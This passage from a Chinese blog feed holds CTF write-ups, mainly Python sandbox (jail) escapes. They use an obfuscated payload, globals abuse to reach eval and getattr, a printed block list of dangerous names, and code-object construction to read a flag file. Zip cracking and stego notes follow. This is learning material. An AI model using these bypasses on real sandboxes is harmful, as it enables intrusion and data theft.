~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~(((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(((~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))"</span></span><br></pre></td></tr></table></figure><p>把这堆不忍直视的玩意儿作为 get_flag 的参数传过去, 就能得到 flag 了</p><h2 id="大概是官方没想到的解法"><a class="headerlink" href="#大概是官方没想到的解法"></a>大概是官方没想到的解法</h2><p>我当时用的不是 <code>我猜想的标准解法</code> 那文章太硬核了看着就怕.</p><p>当时我是通过 <code>get_flag.func_gloabals</code>, 发现了一些有趣的东西</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> get_flag.func_globals</span><br><span class="line">&#123;'PseudoFile': &lt;class '__main__.PseudoFile'&gt;, 'code': &lt;module 'code' from '/usr/lib/python2.7/code.pyc'&gt;, 'bad': ['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], '__builtins__': &lt;module '?' (built-in)&gt;, '__file__': '/home/app/problem.py', 'execfile': &lt;built-in function execfile&gt;, '__package__': None, 'sys': &lt;module 'sys' (built-in)&gt;, 'getattr': &lt;built-in function getattr&gt;, 'Shell': &lt;class __main__.Shell at 0x7fa31706bc80&gt;, 'banned': ['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], 'InteractiveConsole': &lt;class code.InteractiveConsole at 0x7fa31706bc18&gt;, 'eval': &lt;built-in function eval&gt;, 'get_flag': &lt;function get_flag at 0x7fa31707b8c0&gt;, '__name__': '__main__', 'main': &lt;function main at 0x7fa31708e410&gt;, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)&#125;</span><br></pre></td></tr></table></figure><p>加上 <code>.keys()</code> 可能更清晰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_globals.keys()</span><br><span class="line">[<span class="string">'PseudoFile'</span>, <span class="string">'code'</span>, <span class="string">'bad'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__file__'</span>, <span class="string">'execfile'</span>, <span class="string">'__package__'</span>, <span class="string">'sys'</span>, <span class="string">'getattr'</span>, <span class="string">'Shell'</span>, <span class="string">'banned'</span>, <span class="string">'InteractiveConsole'</span>, <span class="string">'eval'</span>, <span class="string">'get_flag'</span>, <span class="string">'__name__'</span>, <span class="string">'main'</span>, <span class="string">'__doc__'</span>, <span class="string">'print_function'</span>]</span><br></pre></td></tr></table></figure><p>可以看到这个地方有大量有趣的玩意儿. 比如利用 eval, 可以绕过对双下划线的过滤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = get_flag.func_globals.values()[<span class="number">12</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e(<span class="string">'&#123;&#125;.##class##.##bases##[0]'</span>.replace(<span class="string">'#'</span>, <span class="string">'_'</span>))</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure><p>利用 getattr, 可以直接获取 file object</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtin=locals().values()[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr=get_flag.func_globals.values()[<span class="number">8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr(builtin, <span class="string">'fi'</span><span class="string">'le'</span>)</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br></pre></td></tr></table></figure><p>然后就变得和套路题一样了...</p><h1 id="the-abyss"><a class="headerlink" href="#the-abyss"></a>The Abyss</h1><p>这道题没被 patch 之前是很简单的, 直接 <code>reload(locals().values()[0])</code> 重新加载builtin模块, 就能愉快地 import 了. 可惜后来被 patch 了, 难度陡增.(话说上一题其实也 patch 过, 然而并没有什么变化...)</p><p>被 patch 以后我看着这道题是非常懵逼的, 没有双下划线, 没有getattr, eval, exec, execfile, reload, input等函数.<br>builtin 也被清理得很彻底, 无从下手大概说的就是这种感觉. <s>于是我就放弃了</s></p><p>但后来在写另一道题时, 突然搜到了一篇惊为天人的文章(可谓有心栽花花不开, 无心插柳柳成荫啊).<br><a href="http://pbiernat.blogspot.com/2014/09/bypassing-python-sandbox-by-abusing.html" target="_blank" rel="noopener">bypassing-python-sandbox-by-abusing</a></p><p>核心思路是: 既然Python是一门面向对象的语言, 数字是对象, 字符串是对象, 连函数也是对象. 那么, 我们为何不通过直接初始化一个函数对象的方法来构造出一个函数, 从而绕过关键词过滤呢?<br>(有点元编程的赶脚)</p><p>首先我们拿出经典的绕过语句, 在本地编写一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure><p>然后通过 <code>function = type(foo)</code>, 可以拿到 function 类.</p><p>看看这个类是怎么实例化的.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: function?</span><br><span class="line">Docstring:</span><br><span class="line">function(code, globals[, name[, argdefs[, closure]]])</span><br><span class="line"></span><br><span class="line">Create a function object from a code object and a dictionary.</span><br><span class="line">The optional name string overrides the name from the code object.</span><br><span class="line">The optional argdefs tuple specifies the default argument values.</span><br><span class="line">The optional closure tuple supplies the bindings for free variables.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure><p>可以发现想要实例化这个类我们至少需要两个玩意儿, 一个 code object, 一个 globals(该怎么称呼这玩意儿呢...全局作用域?<br>globals 可以沿用全局的. 那么就只差一个 code object 了.</p><p>通过 <code>code = type(foo.func_code)</code> 可以得到一个 code 类, 看看参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: code?</span><br><span class="line">Docstring:</span><br><span class="line">code(argcount, nlocals, stacksize, flags, codestring, constants, names,</span><br><span class="line">      varnames, filename, name, firstlineno, lnotab[, freevars[, cellvars]])</span><br><span class="line"></span><br><span class="line">Create a code object.  Not for the faint of heart.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure><p>wow, 好多参数. 具体含义可以到 <a href="https://docs.python.org/2/reference/datamodel.html%E7%9C%8B" target="_blank" rel="noopener">https://docs.python.org/2/reference/datamodel.html看</a>.</p><p>不过这个地方不必关心这些参数的含义, 我们只要照抄就行了. 先全部打印出来:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: print(</span><br><span class="line">    ...:     foo.__code__.co_argcount,</span><br><span class="line">    ...:     foo.__code__.co_nlocals,</span><br><span class="line">    ...:     foo.__code__.co_stacksize,</span><br><span class="line">    ...:     foo.__code__.co_flags,</span><br><span class="line">    ...:     foo.__code__.co_code,</span><br><span class="line">    ...:     foo.__code__.co_consts,</span><br><span class="line">    ...:     foo.__code__.co_names,</span><br><span class="line">    ...:     foo.__code__.co_varnames,</span><br><span class="line">    ...:     foo.__code__.co_filename,</span><br><span class="line">    ...:     foo.__code__.co_name,</span><br><span class="line">    ...:     foo.__code__.co_firstlineno,</span><br><span class="line">    ...:     foo.__code__.co_lnotab,</span><br><span class="line">    ...:     foo.__code__.co_freevars,</span><br><span class="line">    ...:     foo.__code__.co_cellvars</span><br><span class="line">    ...: )</span><br><span class="line">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="literal">None</span>, <span class="number">0</span>, ()), (<span class="string">'__class__'</span>, <span class="string">'__bases__'</span>, <span class="string">'__subclasses__'</span>), (), <span class="string">'&lt;ipython-input-41-f6de0e4db9a4&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ())</span><br></pre></td></tr></table></figure><p>然后进行一些修改以绕过过滤, 就可以开始构造我们的函数了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x <span class="comment"># 获取一个 function 对象</span></span><br><span class="line">function = type(f) <span class="comment"># 获取 function 类</span></span><br><span class="line">code = type(f.func_code) <span class="comment"># 获取 code 类</span></span><br><span class="line">codeobj = code(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="literal">None</span>, <span class="number">0</span>, ()), (<span class="string">'_'</span><span class="string">'_class_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_bases_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_subclasses_'</span><span class="string">'_'</span>), (), <span class="string">'&lt;module&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ()) <span class="comment"># 实例化一个 code 对象</span></span><br><span class="line">foo = function(codeobj, globals()) <span class="comment"># 实例化一个 function 对象</span></span><br><span class="line"><span class="comment"># 现在已经在服务器上建立了一个我们的 foo 函数的拷贝了~</span></span><br></pre></td></tr></table></figure><p>然后执行 <code>foo()</code>, 就能获得大量棒棒的类.</p><p>试着执行 <code>fooo()[40]</code> , 果不其然得到了 file 类. 可以愉快地读取 flag.txt 了~</p><h1 id="总结"><a class="headerlink" href="#总结"></a>总结</h1><p>美国的高中生太可怕了...</p><h1 id="下载"><a class="headerlink" href="#下载"></a>下载</h1><p><a href="http://storage.aloxaf.cn/storage/Mirror Mirror.py" target="_blank" rel="noopener nofollow">Mirror Mirror.py</a></p><p><a href="http://storage.aloxaf.cn/storage/The Abyss.py" target="_blank" rel="noopener nofollow">The Abyss.py</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感谢 M4x 师傅推荐了这个比赛, 虽然是面向美国高中生, 不过打了以后还是有点收获的.&lt;br&gt;
&lt;s&gt;同时内心受到一万点暴击伤害&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;尤其是两道 Python jail, 非常硬却失挺.&lt;br&gt;
(下载地址在文末)&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://www.aloxaf.com/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
      <category term="python" scheme="https://www.aloxaf.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>解决 Arch Linux 下 BurpSuite 打开很丑的问题</title>
    <link href="https://www.aloxaf.com/2018/07/java_ugly_font/"/>
    <id>https://www.aloxaf.com/2018/07/java_ugly_font/</id>
    <published>2018-07-30T04:34:48.000Z</published>
    <updated>2018-07-30T04:34:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>好像很多 Java 程序都有这个毛病.<br>查了半天 Arch Wiki, 终于找到了: <a href="https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts#Anti-aliasing" target="_blank" rel="noopener">Java Runtime Environment fonts</a></p><p>解决方案: 设置环境变量 <code>_JAVA_OPTIONS='-Dawt.useSystemAAFontSettings=on'</code><br>(这么重要的东西怎么还要手动开启??)</p><p>直接在 <code>/etc/environment</code> 里加入这句然后重启即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好像很多 Java 程序都有这个毛病.&lt;br&gt;
查了半天 Arch Wiki, 终于找到了: &lt;a href=&quot;https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts#Anti-aliasing
      
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下在打开方式中增加用 emacsclient</title>
    <link href="https://www.aloxaf.com/2018/07/add_open_by_emacsclient/"/>
    <id>https://www.aloxaf.com/2018/07/add_open_by_emacsclient/</id>
    <published>2018-07-26T00:42:30.000Z</published>
    <updated>2018-07-26T00:42:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="http://liuyuanzhi.blogspot.com/2009/08/open-with-emacs-in-nautilus.html" target="_blank" rel="noopener">open-with-emacs-in-nautilus</a></p><a id="more"></a><ol><li><p>新建 <code>~/.local/share/applications/emacsclient.desktop</code></p></li><li><p>写入如下内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Desktop Entry]</span></span><br><span class="line"><span class="attr">Name</span>=Emacs Client</span><br><span class="line"><span class="attr">GenericName</span>=Text Editor</span><br><span class="line"><span class="attr">Comment</span>=Edit text</span><br><span class="line"><span class="attr">MimeType</span>=text/english<span class="comment">;text/plain;text/x-makefile;text/x-c++hdr;text/x-c++src;text/x-chdr;text/x-csrc;text/x-java;text/x-moc;text/x-pascal;text/x-tcl;text/x-tex;application/x-shellscript;text/x-c;text/x-c++;</span></span><br><span class="line"><span class="attr">Exec</span>=emacsclient -n -a <span class="string">''</span> %F</span><br><span class="line"><span class="attr">Icon</span>=emacs</span><br><span class="line"><span class="attr">Type</span>=Application</span><br><span class="line"><span class="attr">Terminal</span>=<span class="literal">false</span></span><br><span class="line"><span class="attr">Categories</span>=Development<span class="comment">;TextEditor;</span></span><br><span class="line"><span class="attr">StartupWMClass</span>=Emacs</span><br><span class="line"><span class="attr">Keywords</span>=Text<span class="comment">;Editor;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 &lt;a href=&quot;http://liuyuanzhi.blogspot.com/2009/08/open-with-emacs-in-nautilus.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;open-with-emacs-in-nautilus&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="emacs" scheme="https://www.aloxaf.com/tags/emacs/"/>
    
  </entry>
  
  <entry>
    <title>hackme.inndy 部分writeup</title>
    <link href="https://www.aloxaf.com/2018/07/hackme_inndy/"/>
    <id>https://www.aloxaf.com/2018/07/hackme_inndy/</id>
    <published>2018-07-14T07:00:07.000Z</published>
    <updated>2018-08-20T13:37:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>听奥博大佬说对新手很友好, 来试试</p><p>官方不建议直接给出 flag, 就不放 flag 了</p><a id="more"></a><h1 id="misc"><a class="headerlink" href="#misc"></a>Misc</h1><h2 id="flag"><a class="headerlink" href="#flag"></a>flag</h2><blockquote><p>All flags are in this format:<br>FLAG{This is flag's format}</p></blockquote><p>RT</p><h2 id="corgi-can-fly"><a class="headerlink" href="#corgi-can-fly"></a>corgi can fly</h2><blockquote><p>Corgi is cute, right?</p><p>Pillow (Python) and Bitmap (.NET) are your friends.</p><p>(Maybe you can try stegsolve)</p></blockquote><p><code>binwalk</code> 试试没啥玩意儿, <code>hexdump -C</code> 简单看一下,<br>发现末尾有一段可疑的base64字符串</p><p><code>echo RGlkIHlvdSB0cmllZCBMU0I/Cg==|base64 -d</code><br>decode 之, 得到字符串 <code>Did you tried LSB?</code></p><p>根据提示 LSB 走起, 得到二维码, 扫描之, 得到 flag</p><h2 id="television"><a class="headerlink" href="#television"></a>television</h2><blockquote><p>Looks like my television was broken</p></blockquote><p><code>binwalk</code> 试试没啥玩意儿, <code>hexdump -C</code> 简单看一下, 就发现了flag...</p><h2 id="meow"><a class="headerlink" href="#meow"></a>meow</h2><blockquote><p>Pusheen is cute!</p></blockquote><p><code>binwalk</code> 试试好像有点玩意儿, <code>foremost meow.png</code> 提取一下, 得到一个 zip<br>和 png, 试着解压发现zip有密码, <code>unzip -v 00000094.zip</code><br>冷静分析一下这个zip</p><p>发现里面除了 flag 还有一个图片, crc32 值与开始得到的 png 一样. 显然明文攻击, pkcrack 走起.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip plain.zip ../png/00000000.png</span><br><span class="line">pkcrack -C 00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip -p 00000000.png -d flag.zip -a</span><br><span class="line">x flag.zip</span><br><span class="line">cat flag/meow/flag</span><br></pre></td></tr></table></figure><h2 id="where-is-flag"><a class="headerlink" href="#where-is-flag"></a>where is flag</h2><blockquote><p>Do you know regular expression?</p></blockquote><p>下载得到一个 flag.xz, <code>head -c 100</code> 看看解压得到的 flag 文件</p><p><code>wH3r3isFLAGc1oudyoufindit?qqajslfge7frHKFLAGcuonfsE4iJlrp9mCG[fl@g]eK4xdSgJpNuHP{z0ENPuio59R7nxpVgML</code></p><p>看起来 flag 藏在这个文件里面, 试试 <code>cat flag|grep -oP &quot;FLAG{[^{}]+?}&quot;</code>, 完全看不出flag......</p><p>于是选择了暴力...<br><code>cat flag|grep -oP &quot;FLAG{[^{}]+?}&quot;|xargs -P 5 -n 1 ./postflag.py</code></p><p>暴力找到 flag 后发现其实它还是有特征的 <code>FLAG{[0-9a-zA-Z]+}</code></p><h2 id="encoder"><a class="headerlink" href="#encoder"></a>encoder</h2><blockquote><p>Can you decode this?</p></blockquote><p>下载解压得到 <a href="http://encoder.py" target="_blank" rel="noopener">encoder.py</a> 和 flag.enc, 乍一看怀疑这题目真的没放错区吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.uppercase[<span class="number">13</span>:] + string.uppercase[:<span class="number">13</span>] +</span><br><span class="line">        string.lowercase[<span class="number">13</span>:] + string.lowercase[:<span class="number">13</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s.encode(<span class="string">'base64'</span>).split())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.lowercase + string.uppercase))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'FLAG&#123;.....................&#125;'</span>  <span class="comment"># try to recover flag</span></span><br><span class="line"></span><br><span class="line">E = (rot13, base64, hex, upsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(random.randint(<span class="number">30</span>, <span class="number">50</span>)):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    c = random.randint(<span class="number">0</span>, len(E) - <span class="number">1</span>)</span><br><span class="line">    flag = <span class="string">'%d%s'</span> % (c, E[c](flag))</span><br><span class="line"></span><br><span class="line">open(<span class="string">'flag.enc'</span>, <span 